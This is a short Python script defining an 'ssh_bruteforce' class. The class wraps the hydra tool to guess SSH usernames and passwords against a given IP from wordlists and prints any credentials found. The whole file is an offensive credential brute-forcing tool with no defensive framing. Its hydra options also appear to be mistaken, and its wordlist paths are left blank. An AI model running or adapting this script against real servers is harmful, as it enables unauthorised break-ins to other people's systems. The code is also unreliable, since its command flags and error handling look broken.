import subprocess

class ssh_bruteforce:
    def __init__(self, ip, username, password):
        self.ip = ip
        self.username = username
        self.password = password
        self.wordlist_username = ""  # Change this
        self.wordlist_password = ""  # Change this

    def run_command(self, cmd):
        try:
            # result = subprocess.run(cmd.split(), check=True, shell=True, capture_output=True, text=True)
            result = subprocess.run(cmd.split(), check=True, capture_output=True, text=True)
            return result
        except Exception as e:
            print(f"Failed to run command {cmd}.\nException: {e}")


    def run(self):
        if self.username is None and self.password is None:
            cmd = f"hydra -U {self.wordlist_username} -P {self.wordlist_password} ssh://{self.ip}"
        elif self.username is not None:
            cmd = f"hydra -u {self.username} -P {self.wordlist_password} ssh://{self.ip}"
        else:
            cmd = f"hydra -U {self.wordlist_username} -p {self.password} ssh://{self.ip}"
        
        result = self.run_command(cmd)
        output = result.stdout
        print(output)
        # Process stdout to extract username and password
